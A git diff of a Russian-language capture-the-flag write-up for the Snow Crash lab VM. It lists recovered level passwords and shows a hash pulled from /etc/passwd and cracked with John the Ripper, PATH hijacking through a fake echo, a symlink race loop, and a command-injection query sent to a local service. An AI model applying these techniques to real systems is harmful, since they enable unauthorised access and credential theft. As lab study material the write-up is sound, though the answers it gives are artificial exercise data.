@@ -3,11 +3,12 @@
 На платформе intra на странице проекта есть образ, который необходимо запустить на виртуальной машине и получить пароли от пользователей                               \
 level00 level01 level02 level03 level04     \
 level05 level06 level07 level08 level09     \
-level10 level11 level12 level13 level14
+level10 level11 level12 level13 level14     \
+flag14
 
-Скрипт для запуска образа в VirtualBox: `Vbox/setup.sh`.
+Скрипт для запуска образа в VirtualBox: [Vbox/setup.sh](https://github.com/WiccaCrow/Snow_Crash/blob/master/Vbox/setup.sh) .
 
-Полученные пароли записаны в файлы: levelXX/flag, \
+Полученные пароли записаны в файлы: [levelXX](https://github.com/WiccaCrow/Snow_Crash/tree/master/project)/flag, \
 где XX - номер уровня, на котором получен пароль.
 
 Ниже последовательно описаны мои действия по достижению цели.
@@ -15,23 +16,23 @@ level10 level11 level12 level13 level14
 <a name="content"></a> 
 # Содержание и список полученных паролей от пользователя level(xx+1)
 
-| Пользователь level(xx) | пароль от level(xx+1)                     |  
-| ---------------------- | -----------------------------------------:|
-| [level00](#lvl00)      | x24ti5gi3x0ol2eh4esiuxias                 |
-| [level01](#lvl01)      | f2av5il02puano7naaf6adaaf                 |
-| [level02](#lvl02)      | kooda2puivaav1idi4f57q8iq                 |
-| [level03](#lvl03)      | qi0maab88jeaj46qoumi7maus                 |
-| [level04](#lvl04)      | ne2searoevaevoem4ov4ar8ap                 |
-| [level05](#lvl05)      | viuaaale9huek52boumoomioc                 |
-| [level06](#lvl06)      | wiok45aaoguiboiki2tuin6ub                 |
-| [level07](#lvl07)      | fiumuikeil55xe9cu4dood66h                 |
-| [level08](#lvl08)      | 25749xKZ8L7DkSCwJkT9dyv6f                 |
-| [level09](#lvl09)      | s5cAJpM8ev6XHw998pRWG728z                 |
-| [level10](#lvl10)      | feulo4b72j7edeahuete3no7c                 |
-| [level11](#lvl11)      | fa6v5ateaw21peobuub8ipe6s                 |
-| [level12](#lvl12)      | g1qKMiRpXf53AWhDaU7FEkczr                 |
-| [level13](#lvl13)      | 2A31L79asukciNyi8uppkEuSx                 |
-| [level14](#lvl14)      | 7QiHafiNa3HVozsaXkawuYrTstxbpABHD8CPnHJ   |
+| Пользователь level(xx) | Инструмент | Пароль от level(xx+1)                     |  
+| ---------------------- | ---------- | -----------------------------------------:|
+| [level00](#lvl00)      | Идентификатор шифра — [dCode](https://www.dcode.fr/) |  x24ti5gi3x0ol2eh4esiuxias                 |
+| [level01](#lvl01)      | программа John the Ripper | f2av5il02puano7naaf6adaaf                 |
+| [level02](#lvl02)      |  | kooda2puivaav1idi4f57q8iq                 |
+| [level03](#lvl03)      |  | qi0maab88jeaj46qoumi7maus                 |
+| [level04](#lvl04)      |  | ne2searoevaevoem4ov4ar8ap                 |
+| [level05](#lvl05)      |  | viuaaale9huek52boumoomioc                 |
+| [level06](#lvl06)      |  | wiok45aaoguiboiki2tuin6ub                 |
+| [level07](#lvl07)      |  | fiumuikeil55xe9cu4dood66h                 |
+| [level08](#lvl08)      |  | 25749xKZ8L7DkSCwJkT9dyv6f                 |
+| [level09](#lvl09)      |  | s5cAJpM8ev6XHw998pRWG728z                 |
+| [level10](#lvl10)      |  | feulo4b72j7edeahuete3no7c                 |
+| [level11](#lvl11)      |  | fa6v5ateaw21peobuub8ipe6s                 |
+| [level12](#lvl12)      |  | g1qKMiRpXf53AWhDaU7FEkczr                 |
+| [level13](#lvl13)      |  | 2A31L79asukciNyi8uppkEuSx                 |
+| [level14](#lvl14)      |  | 7QiHafiNa3HVozsaXkawuYrTstxbpABHD8CPnHJ   |
 
   
 #
@@ -113,63 +114,59 @@ cat /etc/passwd
 пользователь:пароль(х или другой символ, /etc/shadow расшифрованные пароли):id пользователя uid: gid id группы: домашняя директория: дефолтный shell
 
 Нахожу захешированный пароль flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash
-3. Создаю файл с этой строкой и передаю в john (подсказка в названии файла с level00)
 ```sh
-#------#
-# MacOS
-# https://download.openwall.net/pub/projects/john/contrib/macosx/
+cat /etc/passwd | grep flag01 | grep -E -o ':.............:' | grep -E -o '[^(':')](.*)[^(':')]'
 # ||
 # \/
-# john-1.8.0.9-jumbo-macosx_avx2.zip
-
-# ./john ~/Desktop/snow_crash/lvl01ForJohn
-# cat john.pot
-# ||
-# \/
-# 42hDRfypTqqnw:abcdefg
-
-# либо 
-# ./john ~/Desktop/snow_crash/lvl01ForJohn --show
-# ||
-# \/
-# flag01:abcdefg:3001:3001::/home/flag/flag01:/bin/bash
-
-# можно этим скриптом:
+# 42hDRfypTqqnw
+```
+3. Создаю файл lvl01ForJohn со строкой: \
+```sh
+cat /etc/passwd | grep flag01
+```
+и передаю в john 
+(подсказка в названии файла с level00)       \
+Файл по пути: level01/resources/lvl01ForJohn \
+Там же скрипт для установки john и расшифровывания пароля: \
+`level01/resources/john.sh`:
+```sh
 #!/bin/bash
 
-#!/bin/bash
+if [[ "$OSTYPE" == "linux-gnu" ]]; then
+    sudo snap install john-the-ripper > /dev/null
+    john ./lvl01ForJohn              2> /dev/null
+    echo
+    john ./lvl01ForJohn --show       2> /dev/null    \
+        | grep flag01               \
+        | grep -Eo ':[^(:)]*:'      \
+        | head -1                   \
+        | grep -E -o '[^(':')](.*)[^(':')]'
+    # ||
+    # \/
+    # abcdefg
+    sudo snap remove john-the-ripper > /dev/null
+elif [[ "$OSTYPE" == "darwin"* ]]; then
+    curl -O https://download.openwall.net/pub/projects/john/contrib/macosx/john-1.8.0.9-jumbo-macosx_avx2.zip
+    chmod 777 ./john-1.8.0.9-jumbo-macosx_avx2.zip
+    unzip john-1.8.0.9-jumbo-macosx_avx2.zip
+    rm -rf ./john-1.8.0.9-jumbo-macosx_avx2.zip
+    cd  ./john-1.8.0.9-jumbo-macosx_avx2/run
 
-curl -O https://download.openwall.net/pub/projects/john/contrib/macosx/john-1.8.0.9-jumbo-macosx_avx2.zip
-chmod 777 ./john-1.8.0.9-jumbo-macosx_avx2.zip
-unzip john-1.8.0.9-jumbo-macosx_avx2.zip
-rm -rf ./john-1.8.0.9-jumbo-macosx_avx2.zip
-cd  ~/Desktop/Snow_Crash/Vbox/john-1.8.0.9-jumbo-macosx_avx2/run
-
-./john                                          \
-        ~/Desktop/Snow_Crash/lvl01ForJohn       \
+    ./john                                          \
+        ../../lvl01ForJohn                          \
         # --format=descrypt-opencl                \
         # --wordlist=/usr/share/john/password.lst \
         # --show                                  \
-echo
-cat ~/Desktop/Snow_Crash/Vbox/john-1.8.0.9-jumbo-macosx_avx2/run/john.pot
+    echo
+    cat ./john.pot
 
-echo
-cd  ~/Desktop/Snow_Crash/Vbox
-rm -rf john-1.8.0.9-jumbo-macosx_avx2
-```
-
-```sh
-#------#
-# Ubuntu
-sudo snap install john-the-ripper
-
-john ~/Desktop/github/Snow_crash/lvl01ForJohn --show
-# ||
-# \/
-# Created directory: /home/user/snap/john-the-ripper/555/.john
-# Created directory: /home/user/snap/john-the-ripper/555/.john/opencl
-# flag01:abcdefg:3001:3001::/home/flag/flag01:/bin/bash
-# 1 password hash cracked, 0 left
+    echo
+    cd  ../../
+    rm -rf john-1.8.0.9-jumbo-macosx_avx2
+else
+    echo Oopps
+    exit
+fi
 
 ```
 flag01:**abcdefg**:3001:3001::/home/flag/flag01:/bin/bash \
@@ -326,7 +323,8 @@ ls -la /
 
 создаю своё echo
 ```
-touch /tmp/echo
+echo '#!/bin/bash' > /tmp/echo
+echo "getflag" >> /tmp/echo
 chmod 777 /tmp/echo
 ```
 
@@ -802,7 +800,7 @@ ltrace ./level10 2.txt 127.0.0.1
 # myscript.sh
 touch in
 chmod 777 in
-while 1 
+while true
 do
  ln -sf in mylink
  ln -sf token mylink
@@ -1010,6 +1008,7 @@ curl 127.0.0.1:4646?x= \
 $xx =~ tr/a-z/A-Z/;  переведет в верхний регистр, значит мне надо запустить скрипт, который запустит getflag
 ```sh
 touch MYSCRIPT.SH
+chmod 777 MYSCRIPT.SH
 # ||
 # \/
 ```
@@ -1054,7 +1053,7 @@ cat /tmp/tkn2
 ```sh
 curl 127.0.0.1:4646?x='$(/???/MYSCRIPT.SH)'
 
-cat /tmp/tkn2
+cat /tmp/tkn
 # ||
 # \/
 # Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
